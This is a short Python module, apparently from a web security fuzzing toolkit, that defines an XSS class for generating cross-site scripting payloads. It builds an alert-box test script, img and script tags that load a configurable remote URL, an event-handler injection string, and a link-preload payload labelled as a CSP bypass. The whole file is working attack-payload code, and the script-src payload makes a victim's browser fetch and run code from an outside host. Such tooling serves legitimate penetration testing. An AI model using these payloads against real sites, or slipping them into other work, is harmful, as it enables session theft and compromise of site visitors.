#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """generate XSS payload"""

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return "<script>alert(/xss/)</script>"

    def img(self):
        payload = "<img src='%s'></img>" % self.url
        return payload

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url
